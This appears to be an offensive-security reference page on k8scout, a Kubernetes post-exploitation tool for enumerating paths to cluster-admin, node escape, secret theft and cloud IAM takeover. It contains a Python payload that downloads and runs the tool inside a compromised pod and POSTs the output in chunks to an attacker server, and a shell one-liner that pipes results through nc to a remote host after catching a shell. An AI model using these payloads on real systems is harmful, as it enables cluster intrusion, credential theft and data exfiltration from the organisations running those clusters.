---
type: reference
title: Tool - k8scout (Kubernetes Attack Path Enumeration)
tags: [kubernetes, k8s, post-exploitation, container-escape, privilege-escalation, cloud-iam, gke, rbac]
status: validated
last_updated: 2026-05-12
---

# k8scout -- Kubernetes Attack Path Enumeration Tool

## Core Concept

k8scout is a **single-binary K8s post-exploitation tool** -- drop it into a compromised pod and it immediately enumerates all realistic attack paths to the following objectives:

| Objective | Description |
|-----------|-------------|
| cluster-admin | K8s RBAC privilege escalation |
| Node escape | Container escape to host machine |
| Secret theft | K8s Secrets / ServiceAccount token theft |
| Cloud IAM takeover | GKE Workload Identity -> GCP IAM takeover |

> **Key advantage**: No need to manually understand RBAC rules -- k8scout reads the SA token, enumerates accessible resources via the K8s API, and automatically derives multi-step attack paths.

---

## Version & Download

| Field | Value |
|-------|-------|
| Latest | v0.1.0 (2026-04-16, Pre-release) |
| Language | Go |
| License | MIT |

```bash
# GKE / standard Linux amd64 pod (most common)
wget -q https://github.com/k8scout/k8scout/releases/download/0.1.0/k8scout-linux-amd64 -O /tmp/k8scout
chmod +x /tmp/k8scout

# Other platforms
# k8scout-linux-arm64
# k8scout-darwin-amd64
# k8scout-darwin-arm64
```

---

## Usage

```bash
# Default text output (best for exfiltration)
/tmp/k8scout --output text --timeout 60

# If --output flag is unsupported (older versions)
/tmp/k8scout

# Set timeout (default may be too short)
/tmp/k8scout --timeout 120
```

k8scout reads the following environment information (automatically present inside a pod):
- `/var/run/secrets/kubernetes.io/serviceaccount/token` -> SA JWT
- `/var/run/secrets/kubernetes.io/serviceaccount/namespace` -> current namespace
- Environment variables `KUBERNETES_SERVICE_HOST` / `KUBERNETES_SERVICE_PORT` -> K8s API address

---

## Integration with Deferred RCE Payload

```python
# Auto-execute k8scout in a main.py payload and exfiltrate output
import subprocess, urllib.request, urllib.parse, os, stat

K8SCOUT_URL  = "https://github.com/k8scout/k8scout/releases/download/0.1.0/k8scout-linux-amd64"
K8SCOUT_PATH = "/tmp/k8scout"
VPS_IP       = "10.0.0.1"

def _k8scout_exfil():
    try:
        if not os.path.exists(K8SCOUT_PATH):
            urllib.request.urlretrieve(K8SCOUT_URL, K8SCOUT_PATH)
            os.chmod(K8SCOUT_PATH, stat.S_IRWXU)

        out = subprocess.run(
            [K8SCOUT_PATH, "--output", "text", "--timeout", "60"],
            capture_output=True, text=True, timeout=90
        ).stdout[:8000]

        for i in range(0, max(1, len(out)), 1800):
            body = urllib.parse.urlencode({
                "poc": "k8scout", "chunk": i // 1800, "data": out[i:i+1800]
            }).encode()
            req = urllib.request.Request(
                f"http://{VPS_IP}/rce_proof", data=body, method="POST"
            )
            urllib.request.urlopen(req, timeout=10)
    except Exception as e:
        pass
```

---

## Feature Limitations (v0.1.0)

| Limitation | Description |
|------------|-------------|
| No active pivoting | Enumeration only; does not automatically execute attacks |
| Requires RBAC visibility | SA token needs sufficient permissions for complete results |
| Pre-release | API may change; --output flag not fully documented |

---

## Applicable Scenarios

### GKE Pod RCE (Reference Example)
```
Scenario: vendor-app.example.com FastAPI pod, K8s SA token obtained
K8s API: 10.96.0.1:6443
Pod egress IP: 35.236.149.15
Executing user: app (non-root)

Steps:
1. Pod restart -> main.py loaded by uvicorn
2. k8scout binary downloaded from GitHub to /tmp/k8scout
3. k8scout reads SA token -> enumerates K8s RBAC attack paths
4. Output chunked and POSTed to remote-vps:80/rce_proof
```

### Manual Execution (after obtaining shell)
```bash
# After nc -k -nlvp 443 obtains shell:
wget -q https://github.com/k8scout/k8scout/releases/download/0.1.0/k8scout-linux-amd64 -O /tmp/k8s
chmod +x /tmp/k8s && /tmp/k8s --output text 2>&1 | nc 10.0.0.1 9999
```

---

## Output Interpretation

k8scout output includes:
- **K8s resources accessible by the SA** (pods, secrets, configmaps, etc.)
- **RBAC rule enumeration** (ClusterRole / Role bindings)
- **Multi-step privilege escalation paths** (e.g., list secrets -> extract token -> impersonate admin)
- **Cloud IAM paths** (GKE Workload Identity -> Service Account -> GCP roles)

---

## Comparison with Related Tools

| Tool | Features | Best for |
|------|----------|----------|
| **k8scout** | Automated attack path derivation, single binary | Quick assessment after pod RCE |
| kubectl | Manual enumeration, official CLI | When kubeconfig is available |
| kube-hunter | External black-box scanning | External perspective |
| peirates | Full-featured K8s post-exploitation | Deep exploitation |
| CDK | Container + K8s dual escape | Container escape priority |
